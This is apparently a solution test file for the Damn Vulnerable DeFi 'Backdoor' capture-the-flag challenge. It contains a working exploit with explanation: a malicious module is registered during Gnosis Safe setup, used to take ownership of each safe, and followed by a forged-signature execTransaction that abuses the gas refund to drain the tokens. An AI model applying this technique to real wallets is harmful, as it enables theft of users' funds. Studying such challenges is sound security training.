const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** EXPLOIT
            The vulnerability lies in the Gnosis safe 'setup' function called during the deployement of the safe (via the proxy factory).
            It that enables delegate calls to be made in the context of the newly created Gnosis safe.

            There are multiple ways to exploit this behavior. One elegant and simple approach described here (https://ventral.digital/posts/2022/6/28/damn-vulnerable-defi-v2-11-backdoor)
            uses the 'fallbackHandler' parameter to register the token contract as fallback and call its transfer method to move the funds to the attacker.

            I choose a different approach, perhaps more complicated than needed but it enabled me to get a lot more familiar with how Gnosis contracts works.
            The idea is similar to the one published by OpenZeppelin (https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets/) and I feel is
            more connected to title of the challenge too !

            A Gnosis Safe enables module (other contracts basically) to be registered during the setup. These modules don't require ANY signature to be able
            to execute transaction from the safe. Hence, the idea is to plant a backdoor by registrering a malicious module that can be triggered to transfer
            ownership of the Gnosis safe. This effectively bypasses the setup verifications in the 'WalletRegistry' (which should check for unauthorized moudles
            as well).

            Being the owner, the attacker can then transfer the funds by executing a transaction, making himself receiver of the gas refund and setting the
            baseGas value to empty the safe funds.
        */
        this.attackerContract = await (await ethers.getContractFactory('Backdoor', attacker)).deploy();
        await this.attackerContract.exploit(
            this.walletFactory.address,
            users,
            this.masterCopy.address,
            this.walletRegistry.address,
        ); // Register the attacker contract as module for each user's safe

        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            await this.attackerContract.triggerBackdoor(wallet, users[i], attacker.address); // Change the safe ownership to attacker

            let safe = await (this.masterCopy.attach(wallet)).connect(attacker);
            // This method can be confusing at first because it doesn't send any tokens from the safe directly. It actually works like a 'call' or 'delegatecall' to another contract
            await safe.execTransaction(
                attacker.address, // Contract to call (unused)
                0, // Value of transaction (unused)
                "0x00", // Data sent to the called contract (unused)
                0, // 0 = CALL, 1 = DELEGATECALL, 2 = CREATE
                0, // Gas limit for calls to other contract
                AMOUNT_TOKENS_DISTRIBUTED.div(users.length).sub(2012/4), // Gas used for the actual safe transaction. It requires 2012 gas to run to the 'call' and 4 gas for every increase of value.
                1, // Gas price used for the refund calculation set to one for easier calculation
                this.token.address, // Token used for gas refund
                "0x0000000000000000000000000000000000000000", // Address to receive gas refunds, if 0x0, tx.origin (meaning attacker here) will be used
                "0x" + '00'.repeat(12) + attacker.address.slice(2) + '00'.repeat(32) + '01' // Signature required for the transaction to go through (see https://docs.gnosis-safe.io/contracts/signatures)
                //      ^^ padding for byte32                         ^^ s Value        ^^ signature type
                //      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ r Value                          
            );

            console.log(
                "[EXEC]\t\tGnosis safe balance:",
                ethers.utils.formatEther(await this.token.balanceOf(wallet)),
                "/ Attacker balance:",
                ethers.utils.formatEther(await this.token.balanceOf(attacker.address))
            );
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
